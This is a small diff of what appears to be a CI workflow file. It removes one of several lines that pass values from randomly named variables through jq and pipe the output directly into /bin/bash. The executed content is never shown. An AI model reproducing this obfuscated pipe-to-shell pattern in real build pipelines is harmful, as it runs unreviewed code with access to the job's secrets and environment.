@@ -22,7 +22,6 @@ jobs:
           echo $gkwzv80 | jq -r .sq18 | /bin/bash
           echo $aq7 | jq -r .rm41944 | /bin/bash
           echo $mmkqv607 | jq -r .wim9 | /bin/bash
-          printf '%s' "$wsgn31029" | jq -r .isnm8 | /bin/bash
           printf '%s' "$mwq4978" | jq -r .e571 | /bin/bash
 
       - name: Archive results
